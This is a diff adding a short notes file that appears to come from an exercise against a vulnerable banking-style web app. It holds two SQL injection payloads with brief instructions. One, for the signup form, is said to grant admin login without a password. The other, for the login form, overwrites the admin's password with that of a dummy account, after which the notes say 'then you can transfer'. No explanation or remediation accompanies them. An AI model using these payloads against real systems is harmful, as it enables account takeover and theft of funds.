@@ -1,0 +1,18 @@
+ORIGINALLY INTENDED :
+
+In signup form :
+
+dummy';select * from accounts where username='admin
+
+This will log us onto the admin accounts without any password requirements. (Press F5 once logged)
+Then you can transfer.
+
+
+
+
+In login form :
+
+dummy';update accounts set password=(select password from accounts where username='dummy') where username='admin
+
+This will change the password to the admin's account to the password of the dummy account.
+Then you can transfer.
